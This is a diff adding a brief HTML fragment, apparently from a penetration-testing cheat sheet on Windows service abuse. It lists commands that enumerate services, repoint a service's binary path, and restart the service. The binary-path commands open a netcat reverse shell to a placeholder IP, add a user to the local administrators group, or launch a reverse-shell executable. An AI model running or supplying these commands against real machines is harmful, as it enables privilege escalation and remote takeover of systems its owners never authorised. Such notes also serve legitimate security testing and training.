@@ -1,0 +1,14 @@
+I"À<h3>Services</h3>
+<p><br />Enumeration:<br />
+<code>sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; C:\Temp\output.txt</code><br /></p>
+
+<p>Modify a service binary:<br />
+<code>&gt;sc config [Service_Name] binpath= "C:\nc.exe -nv X.X.X.X 8888 -e C:\WINDOWS\System32\cmd.exe"<br /><br />
+<code>&gt;sc config [Service_Name] binpath= "net localgroup administrators username /add"<br />
+<code>&gt;sc config [Service_Name] binpath= "C:\Documents and Settings\%username%\reverseshell.exe"</code><br /></code></code></p>
+
+<p>Restart service:<br />
+<code>&gt;wmic service NAMEOFSERVICE call startservice</code><br />
+<code>&gt;net stop [service name] &amp;&amp; net start [service name]</code><br /></p>
+
+:ET
